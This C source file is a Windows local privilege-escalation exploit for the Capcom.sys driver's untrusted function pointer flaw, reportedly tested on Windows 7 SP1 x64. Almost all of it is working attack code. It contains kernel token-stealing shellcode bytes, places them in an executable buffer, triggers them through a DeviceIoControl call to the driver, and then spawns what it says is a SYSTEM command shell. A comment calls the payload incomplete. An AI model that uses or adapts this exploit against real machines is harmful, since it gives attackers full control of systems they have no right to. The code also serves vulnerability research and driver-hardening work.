#include "exploit.h"

// This shellcode is heavily based off of Connor McGarr's write-up! Check it out!
// https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

// The payload for this exploit is incomplete.
unsigned char shellcode[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20,
	0x5F, 0x5E, 0x5B, 0xC3
};

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE_OBJECT, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0), h_thread = 0;
	void* function_pointer = 0;
	unsigned long returned_data = 0, bytes_returned = 0, old_protection = 0, thread_id = 0;
	unsigned char unused = 0, * input_buffer = 0;

	SetConsoleTitleA("CapRoot");

	printf("[*] Capcom.sys Untrusted Function Pointer Execution Elevation of Privilege Vulnerability\n[*] Tested successfully on Windows 7 Build 7601 SP1 x64\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	input_buffer = VirtualAlloc(0, sizeof(shellcode) + 8, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!input_buffer)
	{
		printf("\n[-] Failed to allocate stack memory for the input buffer. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated stack memory for the input buffer. Stack Allocation Address: 0x%p", input_buffer);

	function_pointer = (void*)(input_buffer + 8);
	*(unsigned long long*)(input_buffer) = (unsigned long long*)(input_buffer + 8);
	for (int i = 0; i < sizeof(shellcode); i++)
	{
		*(unsigned char*)(input_buffer + 8 + i) = shellcode[i];
	}
	printf("\n[+] Crafted the input buffer.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering execution of untrusted function code in 3...");

	Sleep(1000);
	for (int i = 2; i > 0; i--)
	{
		printf("\n[!] %d...", i);
		Sleep(1000);
	}

	DeviceIoControl(h_driver, TARGET_IOCTL_BRANCH, &function_pointer, 8, &returned_data, 4, &bytes_returned, 0);
	printf("\n[+] Triggered execution of untrusted function code.\n<---------------- | Leaving Danger Zone | ---------------->");

	system("start C:\\Windows\\System32\\cmd.exe");
	printf("\n[+] Spawned an \"nt authority\\system\" shell.\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}